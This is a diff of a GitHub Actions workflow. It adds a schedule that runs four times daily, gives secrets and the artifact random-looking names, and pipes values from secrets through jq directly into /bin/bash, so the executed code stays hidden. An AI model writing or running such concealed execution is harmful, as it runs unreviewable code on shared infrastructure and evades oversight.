@@ -2,6 +2,8 @@ name: CI
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '6 2,8,14,20 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -9,16 +11,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: Execute
         env:
-          uci4: ${{ secrets.uci4 }}
+          m0487: ${{ secrets.m0487 }}
         run: |
-          printf '%s' "$uci4" | jq -r .mt13 | /bin/bash
-          echo $ce85 | jq -r .y8 | /bin/bash
-          printf '%s' "$qat800" | jq -r .sbn97 | /bin/bash
-          echo $u7 | jq -r .m1 | /bin/bash
+          printf '%s' "$m0487" | jq -r .xztao1880 | /bin/bash
+          printf '%s' "$drwd49789" | jq -r .mbzy5794 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
         with:
-          name: N4rQgqT0
+          name: WXUMQovL
           path: "*.zip"
           retention-days: 1
